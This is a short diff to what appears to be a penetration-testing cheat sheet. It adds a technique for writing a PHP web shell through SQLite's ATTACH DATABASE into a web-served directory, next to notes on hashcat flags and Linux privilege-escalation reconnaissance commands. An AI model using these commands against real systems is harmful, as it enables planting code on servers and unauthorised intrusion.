@@ -27,7 +27,11 @@
 
 		 -m 0; 0 is for md5
 		 -a 0; attacks mode is set to 0 which means straight
-		 
+# Writing a shell on the SQLite query executor
+
+	ATTACH DATABASE '/home/devnull/public_html/img/test.php' as pwn;
+        CREATE TABLE pwn.shell (code TEXT); INSERT INTO pwn.shell (code) VALUES ("<pre><?php echo 'Jai baba'; ?></pre>");
+
 # Privilege Escalation (Linux)
 	1. uname -a
 	2. cat /etc/*release*
